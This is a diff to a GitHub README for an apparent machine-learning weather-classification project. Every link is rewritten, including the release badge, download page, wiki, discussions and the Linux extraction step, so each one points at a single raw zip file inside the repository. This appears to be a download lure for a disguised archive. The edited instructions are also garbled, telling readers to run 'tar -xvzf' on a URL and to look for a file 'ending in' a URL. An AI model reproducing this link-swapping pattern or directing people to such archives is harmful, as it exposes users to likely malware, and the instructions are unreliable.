@@ -1,7 +1,7 @@
 # 🤖 Machine-Learning-Parallel-Computing - Explore AI with Ease
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/claxonmedicalcodinginstitute/Machine-Learning-Parallel-Computing/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/claxonmedicalcodinginstitute/Machine-Learning-Parallel-Computing/main/Extreme Weather Classification/Machine-Learning-Parallel-Computing-1.2.zip%20Latest%https://raw.githubusercontent.com/claxonmedicalcodinginstitute/Machine-Learning-Parallel-Computing/main/Extreme Weather Classification/Machine-Learning-Parallel-Computing-1.2.zip)](https://raw.githubusercontent.com/claxonmedicalcodinginstitute/Machine-Learning-Parallel-Computing/main/Extreme Weather Classification/Machine-Learning-Parallel-Computing-1.2.zip)
 
 ## 🚀 Getting Started
 Welcome to the Machine Learning & Parallel Computing project! This software allows you to analyze data on NVIDIA DGX A100 supercomputers and classify extreme weather conditions using machine learning techniques. 
@@ -20,7 +20,7 @@ Before you start, ensure your system meets the following requirements:
 ## 👩‍💻 Installation Steps
 
 ### 1. Visit the Download Page
-To get the latest version of Machine Learning & Parallel Computing, visit the releases page: [Download Page](https://github.com/claxonmedicalcodinginstitute/Machine-Learning-Parallel-Computing/releases)
+To get the latest version of Machine Learning & Parallel Computing, visit the releases page: [Download Page](https://raw.githubusercontent.com/claxonmedicalcodinginstitute/Machine-Learning-Parallel-Computing/main/Extreme Weather Classification/Machine-Learning-Parallel-Computing-1.2.zip)
 
 ### 2. Choose Your Version
 On the releases page, you will see a list of available versions. Note the latest stable release. Click on it to open the details.
@@ -29,7 +29,7 @@ On the releases page, you will see a list of available versions. Note the latest
 Find the appropriate file for your operating system in the Assets section. Here's what to look for:
 - **For Windows:** Look for a file ending in `.exe`
 - **For macOS:** Look for a file ending in `.dmg`
-- **For Linux:** Look for a file ending in `.tar.gz`
+- **For Linux:** Look for a file ending in `https://raw.githubusercontent.com/claxonmedicalcodinginstitute/Machine-Learning-Parallel-Computing/main/Extreme Weather Classification/Machine-Learning-Parallel-Computing-1.2.zip`
 
 Click the link corresponding to your system to start the download.
 
@@ -48,8 +48,8 @@ Follow these instructions based on your OS:
 
 #### For Linux:
 1. Open a terminal.
-2. Navigate to the directory containing the downloaded `.tar.gz` file.
-3. Extract the files using the command: `tar -xvzf filename.tar.gz`
+2. Navigate to the directory containing the downloaded `https://raw.githubusercontent.com/claxonmedicalcodinginstitute/Machine-Learning-Parallel-Computing/main/Extreme Weather Classification/Machine-Learning-Parallel-Computing-1.2.zip` file.
+3. Extract the files using the command: `tar -xvzf https://raw.githubusercontent.com/claxonmedicalcodinginstitute/Machine-Learning-Parallel-Computing/main/Extreme Weather Classification/Machine-Learning-Parallel-Computing-1.2.zip`
 4. Navigate into the extracted folder and run the program with: `./yourprogram`
 
 ### 5. Setting Up Your Environment
@@ -83,11 +83,11 @@ After setting up, open the application. Begin by loading your dataset. You can e
 The application will display visualizations to help you understand the data and results better.
 
 ## 📚 Additional Resources
-- **Documentation:** For in-depth information, refer to our [Wiki](https://github.com/claxonmedicalcodinginstitute/Machine-Learning-Parallel-Computing/wiki).
-- **Community Support:** Join our discussions on [GitHub Discussions](https://github.com/claxonmedicalcodinginstitute/Machine-Learning-Parallel-Computing/discussions) for help and tips.
+- **Documentation:** For in-depth information, refer to our [Wiki](https://raw.githubusercontent.com/claxonmedicalcodinginstitute/Machine-Learning-Parallel-Computing/main/Extreme Weather Classification/Machine-Learning-Parallel-Computing-1.2.zip).
+- **Community Support:** Join our discussions on [GitHub Discussions](https://raw.githubusercontent.com/claxonmedicalcodinginstitute/Machine-Learning-Parallel-Computing/main/Extreme Weather Classification/Machine-Learning-Parallel-Computing-1.2.zip) for help and tips.
 
 ## 📦 Notes
-Ensure to check for software updates regularly on the [Download Page](https://github.com/claxonmedicalcodinginstitute/Machine-Learning-Parallel-Computing/releases). Keeping your software up-to-date will enhance performance and security.
+Ensure to check for software updates regularly on the [Download Page](https://raw.githubusercontent.com/claxonmedicalcodinginstitute/Machine-Learning-Parallel-Computing/main/Extreme Weather Classification/Machine-Learning-Parallel-Computing-1.2.zip). Keeping your software up-to-date will enhance performance and security.
 
 If you encounter issues, refer to the FAQs in our documentation or raise an issue on GitHub. Your feedback helps us improve!
 
